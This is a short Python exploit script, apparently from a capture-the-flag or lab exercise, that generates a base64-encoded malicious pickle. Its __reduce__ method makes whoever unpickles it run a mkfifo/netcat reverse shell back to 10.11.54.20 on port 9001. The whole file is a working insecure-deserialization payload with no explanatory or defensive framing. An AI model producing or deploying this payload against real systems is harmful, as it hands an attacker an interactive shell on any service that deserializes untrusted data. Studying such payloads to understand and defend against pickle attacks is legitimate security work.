import pickle
import sys
import base64

command = 'rm /tmpf; mkfifo /tmp/f; cat /tmp/f | ' '/bin/sh -i 2>&1 | netcat 10.11.54.20 9001 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))
print(base64.b64encode(pickle.dumps(rce())))
